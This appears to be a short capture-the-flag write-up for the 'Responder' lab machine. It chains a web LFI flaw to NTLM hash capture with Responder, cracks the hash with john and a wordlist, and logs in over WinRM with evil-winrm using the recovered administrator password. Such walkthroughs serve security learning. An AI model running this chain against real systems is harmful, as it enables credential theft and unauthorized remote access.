---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
  anchors:
    visible: true
---

# Responder

## Phase 1: Enumeration&#x20;

{% hint style="info" %}
* Open port&#x20;
  * 80 (http)
  * 5985 (WinRM)
{% endhint %}

<figure><img src="../../../.gitbook/assets/01 (23).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
The web application vulnerable to LFI
{% endhint %}

<figure><img src="../../../.gitbook/assets/002 (5).png" alt=""><figcaption></figcaption></figure>

## Phase 2: Exploitation

* the web application work at Microsoft windows
* chain LFI to NTLM relay attack

#### Using Responder

{% code expandable="true" %}
```shellscript
sudo responder -I tun0
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/003 (3).png" alt=""><figcaption></figcaption></figure>

#### crack the hash&#x20;

{% code expandable="true" %}
```shellscript
echo "<HASH>" > hash.txt
john --wordlist=/home/kali/rockyou.txt hash.txt
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/Screenshot 2026-09-01 224744.png" alt=""><figcaption></figcaption></figure>

#### WinRM

{% code expandable="true" %}
```shellscript
evil-winrm -i 10.129.184.73 -u administrator -p badminton
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/Screenshot 2026-09-01 225534.png" alt=""><figcaption></figcaption></figure>

#### root flag

<figure><img src="../../../.gitbook/assets/Screenshot 2026-09-01 225712.png" alt=""><figcaption></figcaption></figure>
